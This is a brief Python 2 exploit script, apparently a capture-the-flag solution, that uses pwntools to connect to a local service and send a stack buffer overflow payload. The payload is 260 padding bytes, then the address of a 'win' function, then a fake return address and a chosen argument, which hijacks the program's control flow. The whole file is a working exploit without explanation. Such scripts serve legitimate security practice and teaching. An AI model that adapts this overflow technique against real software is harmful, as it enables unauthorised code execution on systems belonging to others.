#!/usr/bin/env python2

from pwn import *
from time import sleep

win_addr = p32(0x080485f6)
param = p32(0xcafebabe)
    
s = connect('127.0.0.1',60782)
s.sendline('a'*260 + win_addr + "aaaa" + param)
print(s.recvall())
